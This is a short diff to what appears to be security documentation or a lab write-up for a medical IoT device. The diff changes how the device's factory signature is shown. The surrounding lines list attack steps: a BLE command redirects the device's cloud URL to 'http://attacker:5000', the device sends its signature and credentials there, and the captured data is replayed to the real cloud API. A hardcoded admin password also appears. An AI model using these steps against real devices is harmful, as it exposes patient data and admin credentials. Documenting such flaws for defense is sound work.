@@ -393,7 +393,7 @@ Body: {"username": "admin", "password": "CareOtter2026!"}
 3. Writes {"cmd":"cloud_set","url":"http://attacker:5000"} to 0xFF11
 4. ble_server.py calls _send_registration_to_cloud()
 5. POST http://attacker:5000/admin/device/register
-   Body: {"signature":"CareOtterFactorySig2026", "mac":"AA:BB:...", 
+   Body: {"signature":"9C0C306DEF2A", "mac":"AA:BB:...", 
           "patient":{...}, "admin":{...}, "device_ip":"..."}
 6. Attacker captures the signature and credentials
 7. Replay to the real Cloud API: POST http://192.168.2.2:5002/admin/device/register
@@ -712,7 +712,7 @@ Web browser / Mobile app / curl
 ### 7.4 SSRF in the Medical Cloud
 
 **Problem:** `cloud_set` in BLE provisioning accepts any URL without validation. The device automatically sends:
-- Its factory signature (`CareOtterFactorySig2026`)
+- Its factory signature (12 hex chars, e.g. `9C0C306DEF2A`)
 - Admin and patient credentials
 - Its WiFi IP
 
